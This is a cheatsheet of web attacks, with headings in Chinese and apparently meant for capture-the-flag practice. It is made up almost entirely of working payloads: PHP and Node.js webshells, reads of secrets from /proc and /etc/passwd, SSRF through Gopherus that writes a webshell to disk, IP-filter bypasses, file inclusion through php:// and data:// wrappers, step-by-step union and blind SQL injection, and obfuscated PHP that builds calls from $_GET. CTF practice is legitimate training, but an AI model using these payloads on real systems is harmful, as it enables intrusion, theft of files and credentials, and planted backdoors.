# Web cheatsheets

## Command

### 一句话木马

```
<?php @eval($_POST['shell']);?>
```

### Nodejs Webshell

```
<%= process.mainModule.require("child_process").execSync("cat /flag").toString() %>
```

### 利用/proc目录获取信息

```
# 获取目标当前进程的运行目录与目录里的文件
ls -al /proc/self/cwd
ls /proc/self/cwd
```

```
# 获取当前环境变量
cat /proc/self/environ
```

```
# 获取当前启动进程的完整命令
cat /proc/self/cmdline
```

## 信息泄露

### .git 信息泄露

```
# 1. 恢复源码
python githack.py http://target.com

# 2. 查看log
git log

# 3. git reset恢复版本 / git stash还原文件
git reset --hard 053dxxxxxxxxxxxxxxxxxxxxxxxxxxx645f
或：
git stash list
git stash pop
```

## SSRF

### Gopherus

```
## Usage
|        Command           |        Description             |
|--------------------------|--------------------------------| 
|  gopherus --exploit      |    Arguments can be  :         |
|                          |    --exploit mysql             |
|                          |    --exploit postgresql        |
|                          |    --exploit fastcgi           |
|                          |    --exploit redis             |
|                          |    --exploit zabbix            |
|                          |    --exploit pymemcache        |
|                          |    --exploit rbmemcache        |
|                          |    --exploit phpmemcache       |
|                          |    --exploit dmpmemcache       |
|                          |    --exploit smtp              |
```

```
# mysql
> python2 gopherus.py --exploit mysql
---------------------------------------------
Give MySQL username: root
Give query to execute: select "<?php phpinfo();?>" into outfile "/var/www/html/gopher.php"
```

```
select "<?php @eval($_POST[c]);?>" into outfile "/var/www/html/gopher.php"
```

### file/http/dict协议

- file

```
file://path/to/file
file:///etc/passwd
file://\/\/etc/passwd
ssrf.php?url=file:///etc/passwd
```

- http

```
ssrf.php?url=http://127.0.0.1:22
ssrf.php?url=http://127.0.0.1:80
ssrf.php?url=http://127.0.0.1:443
```

- dict

```
dict://<user>;<auth>@<host>:<port>/d:<word>:<database>:<n>
ssrf.php?url=dict://attacker:11111/
```

### Bypass

- URL Bypass

```
?url=http://notfound.ctfhub.com@127.0.0.1/flag.php
```

- IP Bypass

```
?url=http://127.0.0.1:80
?url=http://localhost:22
?url=http://[::]:80/  >>>  ?url=http://127.0.0.1
?url=http://example.com@127.0.0.1
?url=http://127.0.0.1.xip.io/
?url=http://127。0。0。1  >>>  ?url=http://127.0.0.1
?url=http://0/

# 十六进制、八进制转换
http://127.0.0.1  >>>  http://0177.0.0.1/

# 转换为小数 https://www.browserling.com/tools/ip-to-dec
http://127.0.0.1  >>>  http://2130706433/
```

- 302 Redirector Bypass（互联网上的`sudo.cc`服务默认重定向`127.0.0.1`）

```
?url=http://sudo.cc/flag.php
```

- DNS重绑定：https://lock.cmpxchg8b.com/rebinder.html

```
?url=http://7f000001.c0a80001.rbndr.us/flag.php
```

## 本地文件包含

```
index.php?path=php://filter/read=convert.base64-encode/resource=flag.php
```

## SQL注入

SQL注入流程：判断注入点→判断字段个数→获取数据库名→获取表名→获取字段名→获取表内容。

```
admin' or 1=1 --  # --后加空格
```

### union注入

```
1. 判断列数
?id=1 order by 3
```

```
2. 判断回显
?id=-1 union select 1,2,3
```

```
3. 获取当前数据库
?id=-1 union select 1,2,database()
```

```
4. 获取所有库名
?id=-1 union select 1,2,group_concat(schema_name) from information_schema.schemata
```

```
5. 获取数据表名
?id=-1 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='test'
```

```
6. 获取列名
?id=-1 union select 1,2,group_concat(column_name) from information_schema.columns where table_schema='test' and table_name='users'
```

```
7. 获取字段信息
?id=-1 union select 1,2,group_concat(username,'~',password) from test.users
```

### 盲注

```
1. 测试语句
?id=1 and 1=1
?id=1 and 1=2
```

```
2. 判断库名长度
?id=1 and length(database())=5
```

```
3. 二分法获取库名
?id=1 and ascii(substr(database(),1,1))>120
?id=1 and ascii(substr(database(),1,1))=120
```

```
4. 判断表的数量
?id=1 and (select count(*) tables from information_schema.tables where table_schema='test')=4
```

```
5. 获取表名长度
?id=1 and length((select table_name from information_schema.tables where table_schema='test' limit 0,1))=6
```

```
6. 获取表名
?id=1 and ascii(substr((select table_name from information_schema.tables where table_schema='test' limit 0,1),1,1))=101
```

```
7. 判断列数
?id=1 and (select count(*) columns from information_schema.columns where table_schema='test' and table_name='users')=3
```

```
8. 获取第一列名长度
?id=1 and length((select column_name from information_schema.columns where table_schema='test' and table_name='users' limit 0,1))=2
```

```
9. 获取列名
?id=1 and ascii(substr((select column_name from information_schema.columns where table_schema='test' and table_name='users' limit 0,1),1,1))=120
```

## PHP

### php伪协议

file协议：

```
http://ip:port/readme.php?filename=file:///var/log/auth.log
```

filter协议：

```
http://ip:port/readme.php?filename=php://filter/read/convert.base64-encode/resource=./index.php(或者其他读取文件中含有php代码)
```

filter+file协议：

```
http://ip:port/readme.php?filename=php://filter/read/convert.base64-encode/resource=file:///etc/passwd
```

input协议：

```
http://ip:port/readme.php?filename=php://www.test.com?filename=php://input

# POST方式，参数为：
<?php phpinfo();?>
```

data协议：

```
data://text/plain;base64,

# 打印data://的内容
<?php
// 打印 "I love PHP"
echo file_get_contents('data://text/plain;base64,SSBsb3ZlIFBIUAo=');
?>
```

```
# 执行系统命令
# 将 <?php system(whoami)?> base64编码：PD9waHAgc3lzdGVtKHdob2FtaSk/Pg==
http://ip:port/readme.php?filename=data://text/plain;base64,PD9waHAgc3lzdGVtKHdob2FtaSk/Pg==

# 也可以将webshell进行base64编码/或不编码
http://ip:port/readme.php?filename=data://text/plain;base64,<?php eval($_POST["cmd"]);?>
```

### php自增绕过

```
$_=(_/_._)[1];//A
$_++;//B
$_++;//C
$_1=++$_;//D
$_2=++$_1;//E
$_2++;//F
$_=(_/_._){0};//N
$_++;
$_++;
$_++;
$_++;
$_++;
$_=_.++$_2.$_1.++$_;
$$_{1}($$_{2});//$_GET{1}($_GET{2})
```

## 